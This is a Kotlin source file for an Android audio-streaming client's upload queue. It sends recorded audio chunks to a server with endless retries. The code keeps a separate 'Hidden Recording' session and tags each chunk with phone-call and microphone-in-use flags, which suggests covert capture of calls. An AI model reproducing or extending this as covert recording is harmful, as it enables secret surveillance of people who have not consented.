package com.audiostream.client

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * UploadManager.kt — FIFO upload queue manager.
 *
 * Reads pending chunks from the Room database (ordered by creation time),
 * uploads them sequentially via HTTP POST multipart, and handles all
 * failure/retry logic.
 *
 * GUARANTEES:
 *   - FIFO order: oldest chunk is always uploaded first
 *   - No skipping: never uploads chunk N+1 before chunk N is confirmed
 *   - No data loss: local file is deleted ONLY after server confirmation
 *   - Duplicate protection: if server says "already_exists", mark complete
 *   - Infinite retry: never gives up, continues forever
 *
 * Retry Logic:
 *   1. Retry every 2 seconds, up to 30 times
 *   2. After 30 failures: wait 60 seconds
 *   3. Restart retry cycle
 *   4. Continue forever until success
 */

class UploadManager(
    private val context: Context,
    private val serverUrl: String,
    private val clientName: String,
    deviceInfo: String,
    private val connectionMonitor: ConnectionMonitor,
    private val storageManager: StorageManager,
    private val onLog: (String) -> Unit,
    private val onStatsUpdate: (pending: Int, retries: Int) -> Unit
) {
    companion object {
        private const val RETRY_INTERVAL_MS = 2000L       // 2 seconds between retries
        private const val MAX_QUICK_RETRIES = 30           // 30 retries before long wait
        private const val LONG_WAIT_MS = 60_000L           // 60 seconds after max retries
        private const val UPLOAD_TIMEOUT_SECONDS = 120L    // 2 minute upload timeout
    }

    private val dao = ChunkDatabase.getInstance(context).chunkDao()
    private val isRunning = AtomicBoolean(false)
    private val currentRetryCount = AtomicInteger(0)
    private val uploadSignal = kotlinx.coroutines.channels.Channel<Unit>(kotlinx.coroutines.channels.Channel.CONFLATED)

    @Volatile
    private var activeMainSessionId: String? = null

    @Volatile
    private var activeHiddenSessionId: String? = null

    @Volatile
    private var forceNewMainSession: Boolean = false

    @Volatile
    private var forceNewHiddenSession: Boolean = false

    @Volatile
    private var currentDeviceInfo: String = deviceInfo

    fun updateDeviceInfo(newInfo: String) {
        this.currentDeviceInfo = newInfo
    }

    private val uploadScope = CoroutineScope(
        Dispatchers.IO + SupervisorJob() + CoroutineExceptionHandler { _, e ->
            onLog("Upload manager error: ${e.message}")
        }
    )

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(UPLOAD_TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ══════════════════════════════════════════════════════════════════════
    // START / STOP
    // ══════════════════════════════════════════════════════════════════════

    fun start() {
        if (isRunning.getAndSet(true)) return
        onLog("Upload manager started")

        uploadScope.launch {
            // Reset any chunks stuck in UPLOADING state (from previous crash)
            val reset = dao.resetStuckUploads()
            if (reset > 0) {
                onLog("Reset $reset stuck uploads from previous session")
            }

            // Main upload loop
            uploadSignal.trySend(Unit)
            uploadLoop()
        }
    }

    fun stop() {
        endSession("main")
        endSession("hidden")
        isRunning.set(false)
        onLog("Upload manager stopped")
        uploadScope.coroutineContext.cancelChildren()
    }

    // ══════════════════════════════════════════════════════════════════════
    // MAIN UPLOAD LOOP
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun uploadLoop() {
        while (isRunning.get()) {
            try {
                // Update stats for UI
                updateStats()

                // Get next chunk to upload
                val chunk = dao.getNextPending()
                if (chunk == null) {
                    // Nothing to upload — suspend waiting for new chunk signal (or check every 30s)
                    withTimeoutOrNull(30_000L) {
                        uploadSignal.receive()
                    }
                    continue
                }

                // Attempt upload if server is reachable
                val success = if (!connectionMonitor.isServerReachable()) {
                    onLog("Server not reachable, skipping upload attempt...")
                    false // Treat as upload failure to trigger backoff
                } else {
                    uploadChunk(chunk)
                }

                if (success) {
                    currentRetryCount.set(0)
                } else {
                    // Handle retry logic (will backoff to 60s if unreachable for long enough)
                    handleRetry()
                }

            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                onLog("Upload loop error: ${e.message}")
                delay(RETRY_INTERVAL_MS)
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SESSION MANAGEMENT
    // ══════════════════════════════════════════════════════════════════════

    private fun ensureSession(streamType: String): String? {
        val isMain = (streamType == "main")
        val current = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (current != null) return current

        val forceNew = if (isMain) forceNewMainSession else forceNewHiddenSession

        if (!forceNew) {
            // 1. Try to recover existing active session for this client and stream type
            try {
                val activeUrl = serverUrl.trimEnd('/') + "/api/v1/listen/active?type=$streamType"
                val request = Request.Builder().url(activeUrl).get().build()
                val response = httpClient.newCall(request).execute()
                val body = response.body?.string() ?: ""
                response.close()

                if (response.isSuccessful) {
                    val json = JSONObject(body)
                    val sessionsArray = json.optJSONArray("sessions")
                    if (sessionsArray != null) {
                        for (i in 0 until sessionsArray.length()) {
                            val s = sessionsArray.getJSONObject(i)
                            if (s.optString("client_name") == clientName && s.optString("stream_type", streamType) == streamType) {
                                val recoveredId = s.optString("session_id")
                                if (recoveredId.isNotEmpty()) {
                                    if (isMain) activeMainSessionId = recoveredId else activeHiddenSessionId = recoveredId
                                    onLog("Recovered active $streamType session from server: $recoveredId")
                                    return recoveredId
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                // Ignore recovery failure and proceed to creation
            }
        } else {
            onLog("Skipping session recovery to force a new $streamType session")
            if (isMain) forceNewMainSession = false else forceNewHiddenSession = false
        }

        // 2. Create new session if no active session recovered
        return try {
            val createUrl = serverUrl.trimEnd('/') + "/api/v1/broadcasts"
            val titleText = if (isMain) "Main Recording - $clientName" else "Hidden Recording - $clientName"
            val jsonBody = JSONObject().apply {
                put("client_name", clientName)
                put("device_info", currentDeviceInfo)
                put("title", titleText)
                put("stream_type", streamType)
            }.toString()

            val request = Request.Builder()
                .url(createUrl)
                .post(RequestBody.create("application/json".toMediaType(), jsonBody))
                .build()

            val response = httpClient.newCall(request).execute()
            val body = response.body?.string() ?: ""
            response.close()

            if (response.isSuccessful) {
                val json = JSONObject(body)
                val sid = json.optString("session_id", "")
                if (sid.isNotEmpty()) {
                    if (isMain) activeMainSessionId = sid else activeHiddenSessionId = sid
                    onLog("Session ($streamType) created on server: $sid")
                    sid
                } else null
            } else {
                onLog("Failed to create $streamType session (HTTP ${response.code})")
                null
            }
        } catch (e: Exception) {
            onLog("Session creation error ($streamType): ${e.message}")
            null
        }
    }

    fun endSession(streamType: String) {
        val isMain = (streamType == "main")
        val sid = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (isMain) activeMainSessionId = null else activeHiddenSessionId = null

        if (sid != null) {
            uploadScope.launch {
                try {
                    val endUrl = serverUrl.trimEnd('/') + "/api/v1/broadcasts/$sid/end"
                    val request = Request.Builder()
                        .url(endUrl)
                        .put(RequestBody.create("application/json".toMediaType(), "{}"))
                        .build()
                    httpClient.newCall(request).execute().close()
                    onLog("✓ Session $sid ($streamType) ended on server")
                } catch (e: Exception) {
                    onLog("End $streamType session warning: ${e.message}")
                }
            }
        }
    }

    fun rotateSession(streamType: String) {
        val isMain = (streamType == "main")
        val oldSessionId = if (isMain) activeMainSessionId else activeHiddenSessionId
        if (isMain) {
            activeMainSessionId = null
            forceNewMainSession = true
        } else {
            activeHiddenSessionId = null
            forceNewHiddenSession = true
        }

        if (oldSessionId != null) {
            uploadScope.launch {
                try {
                    val endUrl = serverUrl.trimEnd('/') + "/api/v1/broadcasts/$oldSessionId/end"
                    val request = Request.Builder()
                        .url(endUrl)
                        .put(RequestBody.create("application/json".toMediaType(), "{}"))
                        .build()
                    httpClient.newCall(request).execute().close()
                    onLog("✓ Session $oldSessionId ($streamType) ended on server (Rotation)")
                } catch (e: Exception) {
                    onLog("End $streamType session warning (Rotation): ${e.message}")
                }
            }
        }
        onLog("Rotated $streamType session after 1 hour (Old: $oldSessionId)")
    }

    // ══════════════════════════════════════════════════════════════════════
    // UPLOAD A SINGLE CHUNK
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun uploadChunk(chunk: AudioChunk): Boolean {
        val file = File(chunk.filePath)

        // Check if file still exists
        if (!file.exists()) {
            onLog("Chunk file missing: ${file.name}, removing from queue")
            dao.delete(chunk.uuid)
            return true  // Not really success, but remove from queue
        }

        val sessionId = ensureSession(chunk.streamType) ?: return false

        // Mark as uploading
        dao.markUploading(chunk.uuid)
        updateStats()

        return try {
            val uploadUrl = serverUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/chunk"

            // Build multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "audio",
                    file.name,
                    file.asRequestBody("audio/aac".toMediaType())
                )
                .addFormDataPart("chunk_id", chunk.uuid)
                .addFormDataPart("duration_ms", (chunk.duration * 1000).toInt().toString())
                .addFormDataPart("checksum", chunk.checksum)
                .addFormDataPart("timestamp", chunk.timestamp)
                .addFormDataPart("in_call", if (chunk.inCall) "1" else "0")
                .addFormDataPart("mic_in_use", if (chunk.micInUse) "1" else "0")
                .addFormDataPart("stream_type", chunk.streamType)
                .build()

            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()

            // Execute upload (blocking on IO dispatcher)
            val response = httpClient.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""
            response.close()

            if (response.isSuccessful) {
                // Parse response
                val json = JSONObject(responseBody)
                val status = json.optString("status", "")

                when (status) {
                    "confirmed", "already_exists" -> {
                        // SUCCESS — server confirmed receipt
                        dao.markCompleted(chunk.uuid)

                        // Delete local file
                        if (storageManager.deleteChunkFile(chunk.filePath)) {
                            onLog("✓ Uploaded & cleaned: ${file.name}")
                        } else {
                            onLog("✓ Uploaded: ${file.name} (local delete failed)")
                        }

                        // Clean up completed DB entries periodically without loading them into memory
                        if (dao.getCompletedCount() > 100) {
                            dao.deleteAllCompleted()
                        }

                        updateStats()
                        true
                    }
                    else -> {
                        val msg = json.optString("message", "Unknown error")
                        onLog("Upload rejected: $msg")
                        dao.markFailed(chunk.uuid)
                        updateStats()
                        false
                    }
                }
            } else {
                onLog("Upload failed: HTTP ${response.code}")
                dao.markFailed(chunk.uuid)
                updateStats()
                false
            }
        } catch (e: Exception) {
            onLog("Upload error: ${e.message}")
            dao.markFailed(chunk.uuid)
            updateStats()
            false
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // RETRY LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun handleRetry() {
        val retries = currentRetryCount.incrementAndGet()

        if (retries >= MAX_QUICK_RETRIES) {
            // Long wait after 30 failed attempts
            onLog("$MAX_QUICK_RETRIES retries failed. Waiting 60 seconds...")
            delay(LONG_WAIT_MS)
            currentRetryCount.set(0)  // Reset for next cycle
        } else {
            delay(RETRY_INTERVAL_MS)
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // STATS
    // ══════════════════════════════════════════════════════════════════════

    private suspend fun updateStats() {
        try {
            val pending = dao.getPendingCount()
            val retries = dao.getTotalRetryCount()
            withContext(Dispatchers.Main) {
                onStatsUpdate(pending, retries)
            }
        } catch (e: Exception) {
            // Non-critical
        }
    }

    /**
     * Enqueue a new chunk for upload.
     * Called by AudioRecordService after each chunk is recorded.
     */
    suspend fun enqueueChunk(chunk: AudioChunk) {
        dao.insert(chunk)
        uploadSignal.trySend(Unit)
        updateStats()
        onLog("Enqueued chunk: ${File(chunk.filePath).name}")
    }
}
